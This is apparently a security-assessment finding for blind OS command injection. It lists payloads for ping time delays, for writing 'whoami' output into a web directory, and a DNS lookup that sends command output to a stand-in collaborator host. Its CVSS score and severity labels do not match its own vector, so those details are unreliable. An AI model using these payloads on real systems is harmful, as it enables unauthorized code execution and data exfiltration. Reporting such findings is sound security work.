# Command Injection - Blind / Time-based Command Injection

**Title:** Blind OS Command Injection

**Severity:** Critical

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 8.6

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Vulnerability Type:** Command Injection

**Target:** Blind command execution points

## Impact

Remote code execution even when command output is not directly visible in the response.

## Description

The application executes commands but does not return output. Exploitation uses time delays, file writes, or OAST.

## Steps to Reproduce

Time-based:
- `& ping -c 10 127.0.0.1 &`
- `||ping+-c+10+127.0.0.1||`

Write to web-accessible file:
```
||whoami+>+/var/www/images/whoami.txt||
```
Then retrieve via browser.

OAST:
```
||nslookup+`whoami`.collaborator.example.com||
```

## Recommendation

Same as basic command injection. Restrict network access from the application.

## References

- PayloadsAllTheThings Command Injection
